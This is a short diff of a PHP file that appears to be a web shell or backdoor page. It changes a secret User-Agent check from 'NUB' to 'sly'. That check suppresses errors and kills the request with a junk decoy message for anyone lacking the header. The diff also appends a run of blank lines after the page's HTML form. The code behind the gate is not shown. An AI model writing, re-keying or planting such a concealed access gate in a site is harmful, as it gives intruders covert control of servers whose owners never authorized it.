@@ -2,7 +2,7 @@
 
 //session thing!
 error_reporting(0);
-if($_SERVER['HTTP_USER_AGENT'] != 'NUB' ){
+if($_SERVER['HTTP_USER_AGENT'] != 'sly' ){
 	die("<%^&--++%^-----%^&echo&*------sad$%^&-------@#$%^&*(sds");
 }
 ob_start();
@@ -653,3 +653,18 @@ echo "<form action='' method='POST'>
 	</body>
 </html>
 <html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
